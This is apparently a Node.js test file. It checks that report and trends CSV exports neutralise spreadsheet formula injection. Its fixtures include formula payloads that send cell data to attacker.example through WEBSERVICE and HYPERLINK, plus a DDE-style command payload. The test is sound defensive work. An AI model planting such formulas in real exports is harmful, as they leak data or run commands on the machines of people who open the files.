import test from 'node:test'
import assert from 'node:assert/strict'
import { buildReportCsvExport, buildTrendsCsvExport } from '../lib/report-actions.mjs'

function parseCsv(content) {
  const rows = []
  let row = []
  let cell = ''
  let quoted = false

  for (let i = 0; i < content.length; i += 1) {
    const char = content[i]
    const next = content[i + 1]

    if (quoted) {
      if (char === '"' && next === '"') {
        cell += '"'
        i += 1
      } else if (char === '"') {
        quoted = false
      } else {
        cell += char
      }
    } else if (char === '"') {
      quoted = true
    } else if (char === ',') {
      row.push(cell)
      cell = ''
    } else if (char === '\n') {
      row.push(cell)
      rows.push(row)
      row = []
      cell = ''
    } else {
      cell += char
    }
  }

  row.push(cell)
  rows.push(row)
  return rows
}

function allCells(content) {
  return parseCsv(content).flat()
}

test('report CSV export neutralizes spreadsheet formulas in untrusted audit fields', () => {
  const exportPayload = buildReportCsvExport({
    verdict: 'high-risk',
    riskScore: 92,
    confidence: 'High',
    summary: '=HYPERLINK("https://attacker.example","click")',
    extractedClaims: {
      company: '+cmd|/C calc!A0',
      role: '\t=WEBSERVICE("https://attacker.example/role?c="&A1)',
      location: '-2+3',
      contactMethod: '@SUM(1+1)',
    },
    redFlags: [' =WEBSERVICE("https://attacker.example/redflag?c="&A1)'],
    evidence: [{
      source: '=SourceFormula()',
      type: 'search',
      snippet: '=WEBSERVICE("https://attacker.example/snippet")',
      url: 'https://example.com',
    }],
    nextSteps: ['@HYPERLINK("https://attacker.example","open")'],
  }, new Date('2026-04-30T00:00:00.000Z'))

  const cells = allCells(exportPayload.content)
  assert(cells.includes('\'=HYPERLINK("https://attacker.example","click")'))
  assert(cells.includes("'+cmd|/C calc!A0"))
  assert(cells.includes('\'\t=WEBSERVICE("https://attacker.example/role?c="&A1)'))
  assert(cells.includes("'-2+3"))
  assert(cells.includes("'@SUM(1+1)"))
  assert(cells.includes('\' =WEBSERVICE("https://attacker.example/redflag?c="&A1)'))
  assert(cells.includes("'=SourceFormula()"))
  assert(cells.includes('\'@HYPERLINK("https://attacker.example","open")'))

  for (const cell of cells) {
    assert.doesNotMatch(cell, /^[\s\u0000-\u001f\u007f]*[=+\-@]/)
  }
})

test('trends CSV export neutralizes formulas in public trend labels', () => {
  const exportPayload = buildTrendsCsvExport({
    trendReadyReports: 3,
    sampleQuality: 'limited',
    sampleWarning: '=WEBSERVICE("https://attacker.example/warning")',
    bucketQuality: { normalized: 1, unclear: 0 },
    topLocations: [{ label: '=WEBSERVICE("https://attacker.example/location?c="&A1)', count: 2 }],
    topRoles: [{ label: '+HYPERLINK("https://attacker.example","role")', count: 1 }],
    topContactMethods: [{ label: '\r@SUM(1+1)', count: 1 }],
    verdicts: { 'high-risk': 3 },
  }, new Date('2026-04-30T00:00:00.000Z'))

  const cells = allCells(exportPayload.content)
  assert(cells.includes('\'=WEBSERVICE("https://attacker.example/warning")'))
  assert(cells.includes('\'=WEBSERVICE("https://attacker.example/location?c="&A1)'))
  assert(cells.includes('\'\r@SUM(1+1)'))

  for (const cell of cells) {
    assert.doesNotMatch(cell, /^[\s\u0000-\u001f\u007f]*[=+\-@]/)
  }
})
